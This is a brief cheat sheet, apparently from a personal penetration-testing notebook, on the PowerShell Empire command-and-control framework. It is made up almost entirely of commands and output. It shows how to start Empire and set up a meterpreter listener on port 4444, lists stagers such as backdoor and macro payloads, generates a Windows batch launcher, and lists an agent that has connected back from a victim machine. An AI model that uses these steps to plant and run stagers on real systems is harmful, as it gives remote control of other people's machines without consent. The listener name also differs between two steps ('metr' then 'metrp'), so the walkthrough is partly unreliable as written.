---
title: Empire
author: i4
date: M11-02-2022
---
### Empire
#### Start
`sudo powershell-empire`
#### Listener

> Listeners in Empire are the channels that receive connections from our target machine. Before we do anything in Empire, we need to start the listeners. We can move to the listener management menu by typing command listeners as shown below.

`(Empire) > listeners`

`(Empire: listeners) > help`

* agents - Will allow you to jump to agents menu.
* back & main – Will take you back to the main menu.
* exit – Will exit from Empire.
* help – Will display help menu as shown in the above image.
* info – Will display information about the active listener.
* kill – Will kill a particular listener.
* launcher – Used to generate an initial launcher for a listener.
* list – Will list all the active listeners.
* usestager – Used to use a stager (we will see below what exactly is a stager).
* uselistener – Used to start a listener module.

##### Create new listener

```
(Empire: listeners) > uselistener
dbx     http_com        http_hop
http    http_foreign    meterpreter
(Empire: listeners) > uselistener meterpreter
(Empire: listeners/meterpreter) > set Name metr
(Empire: listeners/meterpreter) > set Port 4444
```

### Stagers
Stagers are like payloads to create a reverse tunnel (just like msfvenom for metasploit)
```
(Empire) > usestager

multi/bash                osx/macho                 windows/launcher_bat
multi/launcher            osx/macro                 windows/launcher_lnk
multi/macro               osx/pkg                   windows/launcher_sct
multi/pyinstaller         osx/safari_launcher       windows/launcher_vbs
multi/war                 osx/teensy                windows/launcher_xml
osx/applescript           windows/backdoorLnkMacro  windows/macro
osx/application           windows/bunny             windows/macroless_msword
osx/ducky                 windows/csharp_exe        windows/shellcode
osx/dylib                 windows/dll               windows/teensy
osx/jar                   windows/ducky
osx/launcher              windows/hta
(Empire) > usestager launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener metrp
(Empire: stager/windows/launcher_bat) > execute

[*] Stager output written out to: /tmp/launcher.bat

(Empire: stager/windows/launcher_bat) >
```

### Agents
As soon as the stager gets executed on the victim we receive a connection back.
```
(Empire: agents) >  list

[*] Active agents:

 Name       Lang    Internal IP     Machine Name    Username    Process         Delay   Last Seen
 --------   ----    --------------  -------------   --------    -------         -----   -------------------
 7A9WSDPN   ps      XXXXXXXXXXXXXX  XXXXXXXXXXXXX   XXXXXXXX    powershell/4032 5/0.0   2020-03-29 09:00:44
```
